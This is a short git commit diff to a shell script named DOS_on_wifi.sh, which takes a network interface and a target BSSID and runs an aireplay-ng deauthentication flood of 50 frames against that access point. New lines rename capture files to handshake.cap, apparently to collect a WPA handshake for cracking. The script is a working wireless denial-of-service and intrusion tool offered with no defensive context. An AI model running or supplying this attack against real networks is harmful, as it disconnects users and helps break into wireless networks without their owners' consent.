79fa4f5308580ca60d6f19f1d96a1bd4d337c7f9
Bibhas Das <125908181+Bibhas1205@users.noreply.github.com>
2023-07-29 15:48:01 +0000

    DOS_on_wifi.sh

--- DOS_on_wifi.sh
+++ DOS_on_wifi.sh
@@ -1,6 +1,8 @@
-if [ $# -ne 1 ]
+if [ $# -ne 2 ]
 then
-echo "Please Enter BSSID"
+echo "Please Enter <network_interface>  <BSSID>"
 else
-sudo aireplay-ng -0 50 -a $1 wlan0
+sudo aireplay-ng -0 50 -a $2 $1
 fi
+mv newcapture*.cap handshake.cap
+rm newcapture*
